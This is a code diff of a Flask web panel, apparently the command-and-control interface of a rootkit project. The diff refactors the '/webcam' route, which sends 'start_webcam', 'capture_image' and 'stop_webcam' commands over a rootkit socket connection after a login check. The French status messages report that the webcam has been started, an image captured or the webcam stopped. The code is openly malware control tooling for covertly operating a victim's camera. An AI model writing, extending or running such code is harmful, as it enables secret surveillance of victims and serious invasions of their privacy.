@@ -1,8 +1,16 @@
+from app import app
+import config as cfg
+from flask import flash, render_template, redirect, url_for, request
+from utils.aes import aes_encrypt
+import os
+from utils.socket import send_to_server
+from werkzeug.utils import secure_filename
+
 # ---------------------------------- WEBCAM ---------------------------------- #
 
 @app.route('/webcam', methods=['GET', 'POST'])
 def webcam():
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
 
     webcam_output = ""
@@ -12,16 +20,16 @@ def webcam():
         action = request.form.get('action')
 
         try:
-            with connection_lock:
-                if rootkit_connection:
+            with cfg.connection_lock:
+                if cfg.rootkit_connection:
                     if action == 'start':
-                        rootkit_connection.sendall(b"start_webcam\n")
+                        cfg.rootkit_connection.sendall(b"start_webcam\n")
                         webcam_output = "✅ Webcam démarrée."
                     elif action == 'capture':
-                        rootkit_connection.sendall(b"capture_image\n")
+                        cfg.rootkit_connection.sendall(b"capture_image\n")
                         webcam_output = "📸 Image capturée avec succès."
                     elif action == 'stop':
-                        rootkit_connection.sendall(b"stop_webcam\n")
+                        cfg.rootkit_connection.sendall(b"stop_webcam\n")
                         webcam_output = "🛑 Webcam arrêtée."
                     else:
                         webcam_output = "❌ Action inconnue."
